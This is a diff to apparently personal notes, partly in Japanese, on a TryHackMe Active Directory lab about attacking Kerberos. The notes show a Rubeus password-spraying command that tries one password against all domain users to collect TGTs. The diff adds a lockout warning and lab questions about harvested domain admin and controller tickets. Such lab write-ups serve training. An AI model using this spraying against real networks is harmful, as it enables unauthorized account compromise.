@@ -104,7 +104,12 @@ Before password spraying with Rubeus, you need to add the domain controller doma
 `echo 10.10.24.3 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts`  
 1.) cd Downloads - navigate to the directory Rubeus is in  
 2.) `Rubeus.exe brute /password:Password1 /noticket` - This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user  
-<img src="https://github.com/mylovemyon/TryHackMe_Images/blob/main/Images/Attacking%20Kerberos_6.png" width="50%" height="50%">
+<img src="https://github.com/mylovemyon/TryHackMe_Images/blob/main/Images/Attacking%20Kerberos_6.png" width="50%" height="50%">  
+Be mindful of how you use this attack as it may lock you out of the network depending on the account lockout policies.
 
 ----------------------------------------Answer the questions below--------------------------------------------------  
 `Rubeus`はWindows用のツールらしい（GitHubからソースコードをとってコンパイルして使わんといかん、メンディー）
+Which domain admin do we get a ticket for when harvesting tickets?  
+<img src="https://github.com/mylovemyon/TryHackMe_Images/blob/main/Images/Attacking%20Kerberos_7.png" width="50%" height="50%">  
+Which domain controller do we get a ticket for when harvesting tickets?  
+<img src="https://github.com/mylovemyon/TryHackMe_Images/blob/main/Images/Attacking%20Kerberos_8.png" width="50%" height="50%">  
